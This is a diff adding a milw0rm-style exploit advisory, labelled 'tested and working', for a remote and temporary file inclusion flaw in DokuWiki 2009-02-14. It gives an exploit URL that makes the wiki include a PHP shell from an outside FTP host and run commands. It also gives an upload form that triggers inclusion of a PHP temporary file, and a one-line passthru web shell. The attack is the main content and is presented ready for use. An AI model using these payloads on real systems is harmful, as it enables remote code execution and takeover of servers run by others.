@@ -1,0 +1,41 @@
+Dokuwiki 2009-02-14 Remote/Temporary File Inclusion exploit
+tested and working
+
+I was reading: http://www.milw0rm.com/exploits/8781
+by girex
+
+[quote]
+It's not a RFI couse use of file_exists function.
+[/quote]
+
+How wrong brother!
+
+trick 1 (ftp:// wrapper with php 5):
+needs register_globals = on
+allow_url_fopen = On (default)
+allow_url_include = On (not default)
+
+http://[host]/dokuwiki-2009-02-14/doku.php?config_cascade[main][default][]=ftp://anonymous:anon@1.12.123.123/folder/sh.php&cmd=ls%20-la>out.txt
+
+trick 2:
+needs register_globals = on
+file_uploads = On (default)
+
+include a temporary file passed by the $_FILES[] array:
+
+<form action="http://[host]/dokuwiki-2009-02-14/doku.php?cmd=ls%20-la" method="post" enctype="multipart/form-data" target="_self">
+<input name="config_cascade[main][default][]" type="file">
+<input type="submit" value="submit">
+</form>
+
+where your shell is like:
+<?php passthru($_GET[cmd]); die();?>
+
+because when there is no prefix or suffix for the affected var, it remains like this:
+/path_to_temporary_folder/php93.tmp !
+
+
+Nine:Situations:Group::pyrokinesis
+site: http://retrogod.altervista.org/
+
+# milw0rm.com [2009-05-26]
